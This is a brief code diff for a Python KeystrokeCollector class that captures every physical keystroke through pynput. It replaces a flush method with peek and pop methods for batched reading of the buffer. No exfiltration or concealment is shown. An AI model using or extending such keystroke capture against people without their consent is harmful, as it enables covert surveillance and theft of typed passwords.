@@ -28,12 +28,15 @@ class KeystrokeCollector:
             self._listener.stop()
             self._listener = None
             
-    def flush(self) -> list[dict]:
-        """Atomically returns and clears the current buffer."""
+    def peek(self, limit: int = 500) -> list[dict]:
+        """Atomically returns up to `limit` items from the front of the buffer."""
         with self._lock:
-            data = self._buffer.copy()
-            self._buffer.clear()
-            return data
+            return self._buffer[:limit]
+            
+    def pop(self, count: int) -> None:
+        """Atomically removes `count` items from the front of the buffer."""
+        with self._lock:
+            del self._buffer[:count]
             
     def _on_press(self, key) -> None:
         """Callback fired by pynput synchronously upon every physical keystroke."""
